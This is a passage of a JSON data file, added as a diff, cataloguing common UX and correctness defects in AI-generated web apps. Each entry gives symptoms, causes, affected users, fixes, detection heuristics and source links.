+  "looksLike": "A card with a title and a footer caption and nothing in between. The console shows 'The width(0) and height(0) of chart should be greater than 0'. It often works in the builder preview and breaks inside a flex or grid layout.",
+  "why": "Responsive chart containers measure their parent, so a parent with no explicit height collapses to zero. Generated layouts nest charts in flex columns and drop the min-height class that the component docs say is required.",
+  "who": "Users see a blank panel and assume there is no data or the product is broken.",
+  "theFix": "Give every chart container an explicit height, min-height or aspect ratio. Ask the tool to load the page and check the console for the width and height warning.",
+  "heur": "Load each page with charts and search the console for 'width(0) and height(0)'; or check the SVG's rendered height.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "recharts/recharts source: src/component/ResponsiveContainer.tsx",
+    "u": "https://github.com/recharts/recharts/blob/main/src/component/ResponsiveContainer.tsx"
+   },
+   {
+    "t": "Fix: Recharts Not Working: Chart Not Rendering, Tooltip Missing, or ResponsiveContainer Showing Zero Height",
+    "u": "https://fixdevs.com/blog/recharts-not-working/"
+   },
+   {
+    "t": "Chart - shadcn/ui",
+    "u": "https://ui.shadcn.com/docs/components/chart"
+   }
+  ],
+  "code": "A209",
+  "rel": [
+   "one-colour-per-bar",
+   "the-3-3-dashed-grid",
+   "the-chart-with-no-words"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-settimeout-save",
+  "name": "The setTimeout Save",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Editing a cell shows 'Saving...' then 'Done', and the promise behind it is a one-second timer.",
+  "looksLike": "You change a target number in a table row and press Enter. A toast says 'Saving Cover page', then 'Done'. Reload the page and the old value is back, because nothing was sent anywhere. The error branch just says 'Error'.",
+  "why": "The dashboard block demonstrates inline editing with toast.promise wrapped around new Promise(resolve => setTimeout(resolve, 1000)). The model keeps the convincing feedback and never replaces the fake promise with a real mutation, because the demo looks like it works.",
+  "who": "People believe their edits are saved and make decisions, or close the tab, on data that was never stored.",
+  "theFix": "Replace every placeholder promise with the real API call and show success only after the server confirms. Tell the tool: search for setTimeout inside any save, submit or toast.promise handler.",
+  "heur": "Grep for toast.promise( with new Promise and setTimeout in the same expression.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/data-table.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/data-table.tsx"
+   }
+  ],
+  "code": "B205",
+  "rel": [
+   "errors-nobody-announces",
+   "toggles-without-consequence",
+   "ascii-only-names"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "two-revenues",
+  "name": "Two Revenues",
+  "track": "behavioral",
+  "group": "Generated content",
+  "category": "Dashboard",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "The same metric is computed differently in each generated component, so screens disagree.",
+  "looksLike": "'Revenue' on the overview card is gross, the chart sums paid invoices, and the table excludes refunds. The numbers differ by a few percent. After another prompt, one of them changes definition again.",
+  "why": "Each component is generated from its own prompt with its own inline query, and nothing gives the model a single trusted metric definition. Regenerating a component can silently redefine the metric.",
+  "who": "Finance and leadership argue about which number is right and stop using the dashboard.",
+  "theFix": "Define each metric once in a shared query or semantic layer and make every component call it. Tell the tool: never write metric SQL inside a UI component.",
+  "heur": "Compare the same metric across cards, charts and exports for one period; any mismatch is the pattern.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI-Generated Dashboards: Fast to Build, Hard to Ship Safely",
+    "u": "https://embeddable.com/blog/ai-generated-dashboards"
+   }
+  ],
+  "code": "B206",
+  "rel": [
+   "the-scripted-trend-caption",
+   "infinity-percent",
+   "floating-point-money"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "ascii-only-names",
+  "name": "ASCII-Only Names",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "Name fields reject apostrophes, hyphens, accents and single names as 'invalid characters'.",
+  "looksLike": "O'Brien, Zoë, María José and people with one name all get 'Please enter a valid name'. Users type a dot as a surname or strip the accent from their own name to get through.",
+  "why": "Asked to 'add validation', models reach for a letters-only regex such as /^[a-zA-Z]+$/ and a required last name, because that is the most common snippet. W3C advises allowing punctuation, spaces and non-ASCII letters and not requiring a family name.",
+  "who": "People whose names are not plain English ASCII are told their own name is wrong.",
+  "theFix": "Accept any characters in name fields, use one full-name field where you can, and only check that it is not empty.",
+  "heur": "Search the code for name validation regexes with A-Z ranges, and try O'Brien and Zoë in the form.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Personal names around the world",
+    "u": "https://www.w3.org/International/questions/qa-personal-names"
+   }
+  ],
+  "code": "A210",
+  "rel": [
+   "red-before-you-finish",
+   "errors-nobody-announces",
+   "toggles-without-consequence"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "autofill-blind-sign-up",
+  "name": "Autofill-Blind Sign-Up",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Forms",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "Sign-up and login fields lack autocomplete hints, so password managers and autofill do nothing.",
+  "looksLike": "The password manager does not offer to save or suggest a password, the browser does not fill the email, and the phone shows a plain keyboard for the email field. Users type everything by hand, usually a weak password.",
+  "why": "Generated form components set type, name and placeholder but rarely the autocomplete values that tell browsers what each field is. The fields look correct, so nobody notices until a real user tries to autofill.",
+  "who": "People with motor or memory impairments and anyone on a phone pay the typing cost, and users choose weaker passwords.",
+  "theFix": "Use type=\"email\" with autocomplete=\"username\", autocomplete=\"new-password\" on sign-up and \"current-password\" on login, plus name and one-time-code where they apply.",
+  "heur": "Check every auth form input for an autocomplete attribute with a valid token.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Sign-up form best practices codelab",
+    "u": "https://web.dev/articles/codelab-sign-up-form-best-practices"
+   }
+  ],
+  "code": "A211",
+  "rel": [
+   "placeholder-as-label",
+   "inputs-with-no-edge",
+   "six-boxes-for-one-code"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "buttons-sized-for-english",
+  "name": "Buttons Sized For English",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Localisation",
+  "harm": "Clarity",
+  "origin": "Training data",
+  "oneLiner": "Fixed-width buttons, tabs and badges that fit the English label and clip every translation.",
+  "looksLike": "In German or Finnish, 'Save' becomes a word twice as long and is cut off, wraps onto two lines, or pushes the icon out of the button. Tab bars overflow and nav labels overlap.",
+  "why": "Generated components often set fixed widths, truncate text or use whitespace-nowrap so the English mock looks tidy. W3C cites expansion of 200 to 300 percent for strings under ten characters, which is exactly what buttons and tabs hold.",
+  "who": "Users of translated versions cannot read key actions, and the product looks careless in their language.",
+  "theFix": "Let buttons and tabs size to their content, allow wrapping in nav, and test with a pseudo-locale that lengthens every string by at least half.",
+  "heur": "Look for fixed w- or max-w- classes and truncate on buttons, tabs and badges, then render with long translated strings.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Text size in translation",
+    "u": "https://www.w3.org/International/articles/article-text-size"
+   }
+  ],
+  "code": "A212",
+  "rel": [
+   "left-is-always-start",
+   "one-items",
+   "language-drift"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "confirmation-switched-off-for-good",
+  "name": "Confirmation Switched Off For Good",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Onboarding",
+  "harm": "Safety",
+  "origin": "Tool default",
+  "oneLiner": "Email confirmation was turned off for testing and never turned back on, so anyone can sign up as anyone.",
+  "looksLike": "Sign-up takes you straight into the app with no email check. You can register with someone else's address, and invites, receipts and password resets then go to a person who never asked for an account.",
+  "why": "Builder docs advise turning off email confirmation while testing so test accounts can sign in at once, and to re-enable it before launch. In a prompt-driven build there is no launch checklist, so the testing setting ships.",
+  "who": "The real owner of the email gets mail they did not ask for, and the app fills with fake or hijacked accounts.",
+  "theFix": "Turn email confirmation back on before real users arrive, and block access to anything shared or paid until the address is verified.",
+  "heur": "Sign up with an address you do not control and see whether you get in without confirming it.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Connect to Supabase",
+    "u": "https://docs.lovable.dev/integrations/supabase"
+   },
+   {
+    "t": "Password-based Auth | Supabase Docs",
+    "u": "https://supabase.com/docs/guides/auth/auth-email"
+   }
+  ],
+  "code": "B207",
+  "rel": [
+   "the-localhost-confirmation-link",
+   "development-keys-in-production",
+   "the-scanner-eaten-magic-link"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "consent-screen-names-your-vendor",
+  "name": "Consent Screen Names Your Vendor",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Onboarding",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Google's sign-in screen says 'continue to xyzabc.supabase.co' instead of the product's own name or domain.",
+  "looksLike": "The user clicks 'Continue with Google' on a site called something friendly, and the Google consent screen names a random string on supabase.co or accounts.dev. It looks like a phishing redirect. Some users stop right there.",
+  "why": "OAuth callbacks run through the auth provider's domain unless you pay for a custom domain or complete Google's app verification. AI builders enable Google sign-in in one prompt and never surface that the consent screen shows the vendor's URL.",
+  "who": "Cautious users abandon sign-up because the domain does not match the site they were on.",
+  "theFix": "Put the auth callback on your own domain (custom auth domain) and verify the OAuth app with Google so the consent screen shows your app name and logo.",
+  "heur": "Click the social sign-in button and read the domain shown on the provider's consent screen.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Continue to custom.domain instead of XXXX.supabase.co when using Google as provider · supabase · Discussion #5041",
+    "u": "https://github.com/orgs/supabase/discussions/5041"
+   },
+   {
+    "t": "Instances / Environments - Development | Clerk Docs",
+    "u": "https://clerk.com/docs/guides/development/managing-environments"
+   }
+  ],
+  "code": "A213",
+  "rel": [
+   "sign-up-to-see-anything",
+   "the-scanner-eaten-magic-link",
+   "the-wrong-browser-magic-link"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "delete-account-keep-account",
+  "name": "Delete Account, Keep Account",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Settings",
+  "harm": "Privacy",
+  "origin": "Model",
+  "oneLiner": "The Delete account button removes the profile row or signs you out, while the login itself lives on.",
+  "looksLike": "Settings has a red 'Delete account' button behind a confirm modal. Afterwards you are signed out, but signing in with the same email still works, or the address is reported as 'already registered'. Often there is no delete option at all, only 'email us'.",
+  "why": "Deleting a Supabase auth user needs the service_role key and must run on a server, so a model writing client code deletes the rows it can reach and calls it done. Generated settings pages copy the visual pattern of account deletion without the server function behind it.",
+  "who": "People who want to leave keep their personal data on file, and app store apps risk rejection, since Apple requires in-app deletion of the whole account record.",
+  "theFix": "Add a server or edge function that deletes the auth user and their data with the admin API, call it from the settings page, and confirm by email when it is done.",
+  "heur": "Delete a test account, then try to sign in or sign up again with the same email.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "5.1.1(v) - Offering account deletion in your app - Guideline reference - App Review - Help - Apple Developer",
+    "u": "https://developer.apple.com/help/app-review/guideline-reference/5-1-1-account-deletion"
+   },
+   {
+    "t": "JavaScript: deleteUser | Supabase Docs",
+    "u": "https://supabase.com/docs/reference/javascript/auth-admin-deleteuser"
+   }
+  ],
+  "code": "B208",
+  "rel": [
+   "no-way-to-delete-the-account",
+   "edits-lost-on-leave",
+   "cross-my-heart"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "development-keys-in-production",
+  "name": "Development Keys In Production",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Onboarding",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "The live app runs on the auth provider's development instance, banner and all.",
+  "looksLike": "The sign-in card carries a 'Development mode' notice, sign-in pages sit on an accounts.dev address, and social login uses shared test credentials. After the hundredth sign-up, new accounts stop being created.",
+  "why": "Code assistants scaffold auth with the development keys from the quickstart and nothing in the build prompts a switch to production keys. Clerk's development instances are capped at 100 users, pass session data in the query string and are described by Clerk as not suitable for production.",
+  "who": "Users see a product that labels itself as unfinished, and growth stops at a hard user cap.",
+  "theFix": "Create a production instance, set your own OAuth credentials and domain, and swap the publishable and secret keys in the production environment only.",
+  "heur": "Check whether the live bundle's publishable key starts with pk_test_ and whether the sign-in UI shows a development notice.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Instances / Environments - Development | Clerk Docs",
+    "u": "https://clerk.com/docs/guides/development/managing-environments"
+   },
+   {
+    "t": "Development Mode UI Changes",
+    "u": "https://clerk.com/changelog/2024-08-02-dev-notice"
+   }
+  ],
+  "code": "A214",
+  "rel": [
+   "confirmation-switched-off-for-good",
+   "sign-up-to-see-anything",
+   "the-tour-that-explains-nothing"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "double-submit-duplicates",
+  "name": "Double-Submit Duplicates",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "Clicking Pay or Create twice on a slow connection makes two orders, two charges or two records.",
+  "looksLike": "The button gives no sign it is working, so the user clicks again. Two identical posts appear, two invitations go out, or the card is charged twice.",
+  "why": "Generated handlers call the API on click with no pending state and no idempotency key, because the happy path in testing is instant. Stripe's docs exist precisely so a retried request does not create a second object.",
+  "who": "Users pay twice or clean up duplicates, and support carries the refunds.",
+  "theFix": "Disable or mark the button as busy while a request is in flight, and send an idempotency key on every create or payment request.",
+  "heur": "Throttle the network, double-click every create and pay button, and count the records made.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Idempotent requests",
+    "u": "https://docs.stripe.com/api/idempotent_requests"
+   },
+   {
+    "t": "Vibe Coding Mistakes: 10 Things That Break Your AI-Built Apps",
+    "u": "https://www.vybe.build/blog/vibe-coding-mistakes"
+   }
+  ],
+  "code": "B209",
+  "rel": [
+   "locked-until-valid",
+   "errors-nobody-announces",
+   "toggles-without-consequence"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "edits-lost-on-leave",
+  "name": "Edits Lost On Leave",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Settings",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Long settings or editor forms discard unsaved changes the moment you click another link.",
+  "looksLike": "You change six fields on the profile page, click 'Billing' in the sidebar to check something, and come back to the old values. Closing the tab or the modal does the same with no warning.",
+  "why": "Generated forms keep values in local component state and save only on submit, with no dirty-state tracking. MDN describes the beforeunload confirmation as the standard way to prevent loss of unsaved data, but it is rarely added unprompted.",
+  "who": "Users lose work and stop trusting the app with long edits.",
+  "theFix": "Track whether the form is dirty, warn on route change and tab close only while it is, or autosave drafts.",
+  "heur": "Edit a settings field, navigate away without saving, and come back.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Window: beforeunload event - Web APIs | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event"
+   }
+  ],
+  "code": "B210",
+  "rel": [
+   "toggles-without-consequence",
+   "delete-account-keep-account",
+   "the-scanner-eaten-magic-link"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "everything-is-200",
+  "name": "Everything Is 200",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Error-handling",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every URL returns 200 OK, so dead links look like working pages to browsers, search engines and monitors.",
+  "looksLike": "A mistyped or deleted URL shows the app's shell with an empty area or an in-app 'not found' message, but the server answered 200. Search engines index thousands of empty pages and uptime checks never flag broken links.",
+  "why": "Single-page apps deployed with the standard catch-all rewrite serve index.html for any path with status 200. AI builders deploy with that rule by default, and Google's own guidance says client-rendered apps need a redirect to a real 404 or a noindex tag to avoid soft 404s.",
+  "who": "Users land from search on pages that do not exist, and the owner gets no signal that links are broken.",
+  "theFix": "Serve a real 404 status for unknown routes (server rendering or a redirect to a /404 that returns 404), and add noindex to client-side error views.",
+  "heur": "Request a nonsense path with curl and read the status code.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Rewrites and proxies | Netlify Docs",
+    "u": "https://docs.netlify.com/routing/redirects/rewrites-proxies/"
+   },
+   {
+    "t": "Understand the JavaScript SEO basics",
+    "u": "https://developers.google.com/search/docs/crawling-indexing/javascript/javascript-seo-basics"
+   }
+  ],
+  "code": "B211",
+  "rel": [
+   "one-bad-record-white-screen",
+   "the-developer-facing-error-page",
+   "silent-success"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "filters-lost-on-back",
+  "name": "Filters Lost On Back",
+  "track": "behavioral",
+  "group": "Components",
+  "category": "Search",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Search, filters and page number live only in component state, so Back, refresh or sharing wipes them.",
+  "looksLike": "You search, filter by status, go to page three and open a record. Pressing Back drops you on page one with no filters. Copying the URL to a colleague shows them the unfiltered list.",
+  "why": "Models store query, filters and pagination in useState because it is the shortest code, not in the URL. Baymard found users treat each filter change as a new view and expect Back to step through them.",
+  "who": "People working through lists redo their search every time they look at a record.",
+  "theFix": "Keep search, filter, sort and page in URL query parameters and read them on load, so Back, refresh and sharing all work.",
+  "heur": "Apply a filter, open an item, press Back; then reload and check whether the URL carries the filter.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "4 Design Patterns That Violate \"Back\" Button UX Expectations",
+    "u": "https://baymard.com/blog/back-button-expectations"
+   }
+  ],
+  "code": "B212",
+  "rel": [
+   "hidden-text-for-the-bot",
+   "misgrounded-citations-pane",
+   "forum-joke-as-fact"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "left-is-always-start",
+  "name": "Left Is Always Start",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Localisation",
+  "harm": "Accessibility",
+  "origin": "Training data",
+  "oneLiner": "Spacing, icons and alignment are set with left and right, so Arabic and Hebrew layouts come out mirrored wrong.",
+  "looksLike": "Switch the app to Arabic and the text flows right to left, but icons sit on the wrong side of labels, back arrows point forward, and padding hugs the wrong edge. The layout looks broken.",
+  "why": "Tailwind code in training data mostly uses physical utilities like ml-, pl- and text-left, so models default to them. Logical utilities such as ms- and me- flip automatically with dir, but they are newer and less common in examples.",
+  "who": "Right-to-left readers get an interface that feels backwards and is harder to scan.",
+  "theFix": "Use logical properties (ms-, me-, ps-, pe-, text-start) and set dir on the html element per locale; mirror directional icons.",
+  "heur": "Count physical left/right utilities against logical ones, and render a page with dir=\"rtl\".",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "CSS logical properties and values - CSS | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_logical_properties_and_values"
+   },
+   {
+    "t": "margin - Tailwind CSS docs",
+    "u": "https://tailwindcss.com/docs/margin"
+   }
+  ],
+  "code": "A215",
+  "rel": [
+   "buttons-sized-for-english",
+   "the-bento-reflex",
+   "text-to-the-glass"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "locked-until-valid",
+  "name": "Locked Until Valid",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Accessibility",
+  "origin": "Training data",
+  "oneLiner": "The submit button stays greyed out until every field passes, and nothing says why.",
+  "looksLike": "A sign-up or checkout form with a faded 'Continue' button. The user has filled everything they can see, but one field is off-screen or fails a hidden rule, so the button never wakes up. Keyboard users cannot even tab to it.",
+  "why": "Disabling submit until the form is valid is a common tutorial and component-demo pattern, and generated forms copy it with a one-line disabled check on the form state. It saves the model from writing error placement and focus logic.",
+  "who": "Users with low vision, keyboard users and anyone who missed one field are stuck with no feedback.",
+  "theFix": "Keep the button enabled. On submit, show each error next to its field, list them in a summary, and move focus to the first one.",
+  "heur": "Look for submit buttons whose disabled attribute is bound to form validity or isValid.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The problem with disabled buttons and what to do instead",
+    "u": "https://adamsilver.io/blog/the-problem-with-disabled-buttons-and-what-to-do-instead/"
+   },
+   {
+    "t": "Don’t Disable Form Controls",
+    "u": "https://adrianroselli.com/2024/02/dont-disable-form-controls.html"
+   }
+  ],
+  "code": "A216",
+  "rel": [
+   "errors-nobody-announces",
+   "toggles-without-consequence",
+   "double-submit-duplicates"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "no-results-for-everything",
+  "name": "No Results For Everything",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "States",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every empty table says 'No results.', whether nothing exists yet, a filter matched nothing, or loading failed.",
+  "looksLike": "A centred grey 'No results.' fills the table on a new account, after a search with no matches, and when the API errored. There is no button to create the first item, clear the filter or retry.",
+  "why": "The shadcn/ui data table example renders exactly 'No results.' in its empty branch, and generated tables keep it. NN/g advises that empty states should say what state the system is in and give a direct path forward.",
+  "who": "Users cannot tell whether they did something wrong, whether data is missing, or what to do next.",
+  "theFix": "Write separate empty states for 'nothing yet' (with a create action), 'no matches' (with a clear filters action and the query shown) and 'could not load' (with retry).",
+  "heur": "Grep for the literal 'No results.' and check whether the table distinguishes filtered, empty and error states.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Data Table - shadcn/ui",
+    "u": "https://ui.shadcn.com/docs/components/data-table"
+   },
+   {
+    "t": "Designing Empty States in Complex Applications: 3 Guidelines",
+    "u": "https://www.nngroup.com/articles/empty-state-interface-design/"
+   },
+   {
+    "t": "Search UX: 5 Proven Strategies for Improving \"No Results\" Pages",
+    "u": "https://baymard.com/blog/no-results-page"
+   }
+  ],
+  "code": "A217",
+  "rel": [
+   "blank-page-no-instructions",
+   "the-empty-state-flash",
+   "regression-on-every-prompt"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "one-bad-record-white-screen",
+  "name": "One Bad Record, White Screen",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Error-handling",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "One missing field in the data crashes a component and the whole app turns blank.",
+  "looksLike": "The dashboard works for the demo account. For a real user with one null avatar or an empty array, the page goes completely white. Reloading does nothing, and the console shows 'Cannot read properties of undefined'.",
+  "why": "Since React 16 an uncaught render error unmounts the entire component tree. Generated components assume the shape of the sample data they were written against, and assistants rarely add error boundaries around sections.",
+  "who": "Users with slightly unusual data lose the whole app, not just the broken card.",
+  "theFix": "Wrap each major section in an error boundary with a small 'This part failed to load, retry' fallback, and guard optional fields in the data.",
+  "heur": "Feed the page a record with nulls and empty lists, and check whether one card fails or the whole screen goes blank.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Error Boundaries – React",
+    "u": "https://legacy.reactjs.org:443/docs/error-boundaries.html"
+   },
+   {
+    "t": "Vibe Coding Mistakes: 10 Things That Break Your AI-Built Apps",
+    "u": "https://www.vybe.build/blog/vibe-coding-mistakes"
+   }
+  ],
+  "code": "B213",
+  "rel": [
+   "the-developer-facing-error-page",
+   "everything-is-200",
+   "silent-success"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "one-items",
+  "name": "One Items",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Localisation",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Counts are built as number plus fixed plural, giving '1 items' and '1 days ago'.",
+  "looksLike": "The cart says '1 items', the badge says '1 new messages', and the activity feed says '1 days ago'. In translated versions the grammar is wrong for every number above one too.",
+  "why": "Generated UI interpolates counts with `${count} items`, and the singular case does not show up in demo data that always has several rows. English has two plural forms, but Arabic has six, so simple ternaries fail once the app is translated.",
+  "who": "Every user sees a small grammar slip that makes the product feel unfinished, and translated users see many.",
+  "theFix": "Use Intl.PluralRules or your i18n library's plural support for every count, and test with 0, 1 and 2.",
+  "heur": "Grep for template strings with a count followed by a plural noun, and set a list to exactly one item.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Intl.PluralRules - JavaScript | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/PluralRules"
+   }
+  ],
+  "code": "A218",
+  "rel": [
+   "buttons-sized-for-english",
+   "left-is-always-start",
+   "language-drift"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "red-before-you-finish",
+  "name": "Red Before You Finish",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Wellbeing",
+  "origin": "Tool default",
+  "oneLiner": "Fields turn red with 'Invalid email' after the first keystroke, before you have finished typing.",
+  "looksLike": "Type the first letter of your email and the field is already red. Tab into an empty field and leave, and it scolds you. The error flickers on and off with every character.",
+  "why": "Generated forms often set validation to run on every change because it looks responsive in a demo. Smashing's research summary says late validation almost always performs better and that empty fields should only be checked on submit.",
+  "who": "Users feel told off for doing nothing wrong, and anxious or slower typists abandon long forms.",
+  "theFix": "Validate a field when the user leaves it, then re-check on each keystroke only once it has an error, so fixes are confirmed at once ('reward early, punish late').",
+  "heur": "Check the form library's mode setting for 'onChange' or 'all', and type slowly into an email field to see when errors appear.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "A Complete Guide To Live Validation UX",
+    "u": "https://Smashingmagazine.Com/2022/09/inline-validation-web-forms-ux/"
+   }
+  ],
+  "code": "A219",
+  "rel": [
+   "ascii-only-names",
+   "errors-nobody-announces",
+   "validation-that-lies"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "schema-speak-errors",
+  "name": "Schema-Speak Errors",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Form errors read like the validation library talking: 'String must contain at least 1 character(s)'.",
+  "looksLike": "Leave a field empty and the red text says 'String must contain at least 1 character(s)', 'Expected string, received null' or 'Invalid input'. Every field uses the same robotic wording, and none says what to type.",
+  "why": "AI form code nearly always pairs react-hook-form with a Zod schema and renders the schema's message under each field. Zod's default messages are written for developers, and the model often adds .min(1) without a human message.",
+  "who": "Users who are not developers cannot tell what the form wants, and the product sounds machine-made.",
+  "theFix": "Give every schema rule a plain message ('Enter your email', 'Use at least 8 characters') or set a global error map in your own voice.",
+  "heur": "Grep rendered error text for 'String must', 'Expected', 'received', 'character(s)' and 'Invalid input'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "z.string() validates empty strings (colinhacks/zod issue #2466)",
+    "u": "https://github.com/colinhacks/zod/issues/2466"
+   },
+   {
+    "t": "Error Handling in Zod",
+    "u": "https://zod.dev/ERROR_HANDLING"
+   }
+  ],
+  "code": "A220",
+  "rel": [
+   "errors-nobody-announces",
+   "validation-that-lies",
+   "toggles-without-consequence"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "six-boxes-for-one-code",
+  "name": "Six Boxes For One Code",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Forms",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "A verification code split across six hand-built inputs that break paste and SMS autofill.",
+  "looksLike": "Six square boxes for a six-digit code. Pasting the code fills only the first box, the phone's 'From Messages' suggestion does nothing, and backspace jumps unpredictably. Screen readers announce six unlabelled edit fields.",
+  "why": "The split-box look is the default visual for verification codes, so models recreate it with six separate inputs and focus-jumping handlers instead of one field. Libraries such as the shadcn Input OTP solve this with a single real input underneath, but hand-rolled versions do not.",
+  "who": "Users on phones, screen reader users and anyone pasting from email struggle at the last step of sign-in.",
